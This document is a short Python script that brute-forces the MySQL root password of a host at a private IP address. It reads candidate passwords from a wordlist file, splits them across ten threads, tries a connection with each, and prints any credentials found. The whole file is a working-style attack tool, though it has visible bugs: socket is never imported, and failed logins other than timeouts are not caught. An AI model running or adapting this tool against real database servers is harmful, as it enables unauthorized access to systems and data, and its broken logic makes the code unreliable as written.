import mysql.connector
import numpy as np
import concurrent.futures
import traceback

NO_THREADS = 10


def try_connection(potential_array):
    for val in potential_array:
        val = val.rstrip()
        print("Try with val: {}".format(val))
        try:
            connector = mysql.connector.connect(user="root", database="information_schema", host="192.168.230.130",
                                                password=val, connection_timeout=60)
            connector.close()
        except socket.timeout as err:
            print("timeout {}".format(err))
            traceback.print_exc()
            continue
        print("Connector: {}".format(connector))
        if connector:
            print("Found credentials: root with pass: {}".format(val))
            return connector
    return -1


def main():
    print("Searching for pass")
    # TODO: pass the file as an argument
    passwordsFile = open("cain.txt", "r")

    line = passwordsFile.readline()
    s = 0
    arrayOfLists = []
    for i in range(NO_THREADS):
        arrayOfLists.append([])

    while line:
        arrayOfLists[(s % NO_THREADS)].append(line)
        line = passwordsFile.readline()
        s = s + 1

    print("Numbers of lists: {}".format(len(arrayOfLists)))
    with concurrent.futures.ThreadPoolExecutor() as executor:
        results = executor.map(try_connection, arrayOfLists)


if __name__ == '__main__':
    main()
